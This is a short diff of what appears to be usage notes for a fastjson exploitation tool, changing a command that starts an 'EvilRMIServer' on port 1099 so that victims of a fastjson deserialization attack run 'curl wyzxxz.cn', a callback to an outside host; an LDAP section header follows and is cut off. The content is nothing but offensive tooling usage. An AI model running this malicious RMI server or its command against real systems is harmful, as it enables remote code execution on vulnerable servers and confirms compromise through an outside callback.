@@ -2,7 +2,7 @@
 
 ```
 rmi:
-java -cp fastjson_tool.jar EvilRMIServer 1099 53 "curl .cn"
+java -cp fastjson_tool.jar EvilRMIServer 1099 53 "curl wyzxxz.cn"
 
 
 ladp:
